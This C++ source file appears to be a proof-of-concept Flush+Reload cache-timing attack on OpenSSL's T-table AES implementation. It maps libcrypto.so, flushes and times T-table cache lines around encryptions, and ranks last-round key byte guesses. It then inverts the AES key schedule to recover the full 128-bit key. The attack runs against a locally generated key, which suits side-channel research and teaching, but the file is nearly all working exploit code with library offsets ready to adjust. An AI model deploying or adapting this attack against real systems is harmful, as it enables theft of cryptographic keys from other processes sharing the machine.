#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "../../cacheutils.h"
#include <map>
#include <vector>


// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (133)

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (16000)

//AES sBox for encryption
unsigned char sBox[] =
{ /*  0    1    2    3    4    5    6    7    8    9    a    b    c    d    e    f */
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76, /*0*/ 
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0, /*1*/
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15, /*2*/
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75, /*3*/
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84, /*4*/
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf, /*5*/
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8, /*6*/ 
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2, /*7*/
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73, /*8*/
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb, /*9*/
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79, /*a*/
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08, /*b*/
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a, /*c*/
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e, /*d*/
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf, /*e*/
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16  /*f*/
};



//inverse AES key
static void aes128_key_schedule_inv_round(unsigned char *p_key, uint8_t rcon)
{
  uint8_t round;
  unsigned char * p_key_0 = p_key + 16 - 4;
  unsigned char * p_key_m1 = p_key_0 - 4;
for (round = 1; round < 4; ++round)
{
/* XOR in previous word */
p_key_0[0] ^= p_key_m1[0];
p_key_0[1] ^= p_key_m1[1];
p_key_0[2] ^= p_key_m1[2];
p_key_0[3] ^= p_key_m1[3];
p_key_0 = p_key_m1;
p_key_m1 -= 4;
}
/* Rotate previous word and apply S-box. Also XOR Rcon for first byte. */
p_key_m1 = p_key + 16 - 4;
p_key_0[0] ^= sBox[p_key_m1[1]] ^ rcon;
p_key_0[1] ^= sBox[p_key_m1[2]];
p_key_0[2] ^= sBox[p_key_m1[3]];
p_key_0[3] ^= sBox[p_key_m1[0]];
}
static void last_to_master(unsigned char *p_key){
  uint8_t rcon[10] = {0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36}; 
  for (size_t r = 0; r < 10; r++){
    aes128_key_schedule_inv_round(p_key, rcon[9-r]);
  }
}
unsigned char key[] =
{
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  //0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc, 0x4f, 0x6e, 0x9c,
  //0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80
};



char* base;
char* probe;
char* end;

int get_max_index(double timings[], int l){
  int res = 0;
  for (int i=0; i < l; i++){
   if (timings[i]>timings[res])
     res=i;
  }
  return res;
}

int main()
{
  //int gdriver=DETECT,gmode;   
  //initgraph(&gdriver, &gmode, ""); // 初始化绘图屏幕
  //setbkcolor(9);
  //setcolor(15);
  //cleardevice();
  // offsets of T-tables in libcryto.so.1.0.0 for Linux-X86_64, change according to your libcrypto.so
  int T[4];
  T[0] = 0x16BEC0;
  T[1] = 0x16BAC0;
  T[2] = 0x16B6C0;
  T[3] = 0x16B2C0;

  int fd = open("libcrypto.so.1.0.0", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;
  printf("base %p\n", (void*) (base));
  printf("end  %p\n", (void*) (end)); 
  //------------------------------------------------------------------------------
  unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
  unsigned char ciphertext[128];
  unsigned char restoredtext[128];

  uint64_t min_time = rdtsc();
  srand(min_time);
  printf("Key used for encryption\n");
  for (size_t j = 0; j < 16; ++j){ //randomize the key for encryption
          key[j] = rand() % 256;
    printf("%02x ", key[j]);
  }
  printf("\n");

  AES_KEY key_struct;

  AES_set_encrypt_key(key, 128, &key_struct);
  printf("here\n");
  
  unsigned char key_guess[16];
  void* address;
  int max;
  size_t delta, l;
  double Ratio[256];
  double patt[256][16];
  //int H0_hit, H0_miss, H0_total, H1_hit, H1_miss, H1_total;
  
  //-------------------------last-round attack for each key byte------------------------------
 printf("Waiting for recovering ...\n");
for (size_t b=0; b < 16; ++b){// the b-th byte
 printf("b = %ld\n", b);
 for (size_t m=0;  m < 256; ++m)
    Ratio[m] = 0;
 for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
 {
   for (size_t j = 0; j < 16; ++j)
      plaintext[j] = rand() % 256;

   for (l = 0; l < 16; ++l) // recover by l-th memory lines    
   {
    probe = base + T[(b % 4 + 2) % 4] + 64 * l;
    //address = (void *) probe;
    //printf("%p ", address);
    flush(probe);
   }
   AES_encrypt(plaintext, ciphertext, &key_struct);
   sched_yield();
   for (l=0; l < 16; ++l){
     probe = base + T[(b % 4 + 2) % 4] + 64 * l;
     size_t time = rdtsc();
     maccess(probe);
     delta = rdtsc() - time;
     sched_yield();
     if (delta < MIN_CACHE_MISS_CYCLES){
        for (size_t m=0;  m < 16; ++m){
          Ratio[sBox[16 * l + m] ^ ciphertext[b]]++;
        }
     }
   }
    
  }//end of samples
  sched_yield();
  for (size_t byte = 0; byte < 256; ++byte){
      Ratio[byte] = (double)Ratio[byte] /(double) NUMBER_OF_ENCRYPTIONS;
      patt[byte][b] = Ratio[byte];
      //printf("%f ", Diff_ratio[byte]);
  }
  sched_yield();

  max = get_max_index(Ratio, 256);  
  //printf("\n");
  key_guess[b] = max;
  printf("last_round byte %02x \n", (unsigned char)key_guess[b]);
  
  
}//end of b bytes
printf("\n");

 printf("Key used for encryption\n");
  for (size_t j = 0; j < 16; ++j){ 
    printf("%02x ", key[j]);
  }
  printf("\n");
 
 printf("Last round key recovered\n");
 for (int i =0; i< 16; i++)
  {//if (key_guess[i]==key[i])
       printf("%02x ",key_guess[i]);
  }

 last_to_master(key_guess);
  printf("\n");
  printf("Full key recoverd\n");
  for (int i =0; i< 16; i++)
  {//if (key_guess[i]==key[i])
       printf("%02x ",key_guess[i]);
  }
  printf("\n");
  
  FILE *fp = fopen("current", "w");
  
  for (int i=0; i < 256; ++i){
    fprintf(fp, "%d ", i);
    for (int j=0; j < 16; ++j)
      fprintf(fp, "%f ", patt[i][j]);
    fprintf(fp, "\n");
  }
  fclose(fp);
  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  //getch();
  //closegraph();
  return 0;
}

